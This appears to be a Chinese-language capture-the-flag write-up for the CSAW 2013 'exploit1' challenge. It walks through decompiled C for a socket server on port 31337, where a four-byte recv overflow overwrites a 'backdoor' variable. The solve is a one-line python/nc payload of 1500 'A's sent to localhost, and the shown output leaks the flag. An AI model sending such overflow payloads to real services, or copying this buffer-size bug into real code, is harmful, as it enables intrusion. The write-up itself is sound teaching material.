

```shell
# from IDA string
LOAD:08048440	0000000A	C	GLIBC_2.0
.rodata:08048CB0	00000015	C	Welcome to CSAW CTF.
.rodata:08048CC7	00000006	C	./key
.rodata:08048CD1	00000006	C	31337
.rodata:08048CD7	00000008	C	0.0.0.0
.rodata:08048CDF	0000000C	C	getaddrinfo
```
跟进 `./key`，看哪里调用了，来到：
```C
void __cdecl handle(int newsock)
{
  char buffer[1016]; // [esp+14h] [ebp-404h] BYREF
  int backdoor; // [esp+40Ch] [ebp-Ch]

  backdoor = 0;
  memset(buffer, 0, sizeof(buffer));
  send(newsock, "Welcome to CSAW CTF.", 0x15u, 0);
  recv(newsock, buffer, 0x3FCu, 0);             // 溢出点，buffer size = 1016, 0x3fc = 1020, 
  buffer[1015] = 0;
  if ( backdoor )                               // 溢出修改 backdoor 值，IDA可以看得出，backdoor 的位置相对于 buffer 而言是在高地址位置，直接覆盖成非0即可
  {
    fd = (int)fopen("./key", "r");
    __isoc99_fscanf(fd, "%s\n", buffer);
    send(newsock, buffer, 0x200u, 0);
  }
  close(newsock);
}
```
那就看怎么进入到 handle，发现在`main`进行的调用：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int i; // eax
  int result; // eax
  int v5; // ebx
  char *v6; // eax
  socklen_t addr_len; // [esp+2Ch] [ebp-D8h] BYREF
  struct sockaddr addr; // [esp+30h] [ebp-D4h] BYREF
  int optval; // [esp+40h] [ebp-C4h] BYREF
  struct addrinfo *pai; // [esp+44h] [ebp-C0h] BYREF
  struct addrinfo req; // [esp+48h] [ebp-BCh] BYREF
  struct sigaction act; // [esp+68h] [ebp-9Ch] BYREF
  __pid_t v13; // [esp+F4h] [ebp-10h]
  int v14; // [esp+F8h] [ebp-Ch]
  int socket_pipe; // [esp+FCh] [ebp-8h]

  optval = 1;
  for ( i = 0; i < 0x20; i += 4 )
    *(int *)((char *)&req.ai_flags + i) = 0;
  req.ai_family = 2;
  req.ai_socktype = 1;
  if ( getaddrinfo("0.0.0.0", "31337", &req, &pai) )    // 监控 本机 31337端口，尝试获取
  {
    perror("getaddrinfo");
    result = 1;
  }
  else
  {
    socket_pipe = socket(pai->ai_family, pai->ai_socktype, pai->ai_protocol);// 尝试建立socket连接
    if ( socket_pipe == -1 )                    // socket 失败
    {
      perror("socket");
      result = 1;
    }
    else if ( setsockopt(socket_pipe, 1, 2, &optval, 4u) == -1 )
    {
      perror("setsockopt");
      result = 1;
    }
    else if ( bind(socket_pipe, pai->ai_addr, pai->ai_addrlen) == -1 )
    {
      perror("bind");
      result = 1;
    }
    else if ( listen(socket_pipe, 100) == -1 )
    {
      perror("listen");
      result = 1;
    }
    else
    {
      freeaddrinfo(pai);
      act.sa_handler = wait_for_child;
      sigemptyset(&act.sa_mask);
      act.sa_flags = 0x10000000;
      if ( sigaction(17, &act, 0) == -1 )
      {
        perror("sigaction");
        result = 1;
      }
      else
      {
        while ( 1 )
        {
          addr_len = 16;
          v14 = accept(socket_pipe, &addr, &addr_len);
          if ( v14 == -1 )
          {
            perror("accept");
            return 0;
          }
          v5 = htons(*(uint16_t *)addr.sa_data);
          v6 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
          printf("Got a connection from %s on port %d\n", v6, v5);// 成功建立连接之后
          v13 = fork();
          if ( !v13 )
          {
            close(socket_pipe);
            handle(v14);
            return 0;
          }
          if ( v13 == -1 )
            break;
          close(v14);
        }
        perror("fork");
        result = 1;
      }
    }
  }
  return result;
}
```
是个 socket 的监听服务端，nc 上去直接发长内容。
```shell
# 终端一放着运行程序
➜  Csaw13_pwn_exploit1 ./exploit1 
Got a connection from 127.0.0.1 on port 56110
```

```shell
# 终端二发起连接并发送内容
  Csaw13_pwn_exploit1 python -c 'print "A"*1500' | nc 127.0.0.1 31337
Welcome to CSAW CTF.flag{7c1fbb502632bffa6e62ba6fa847681f}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%
```
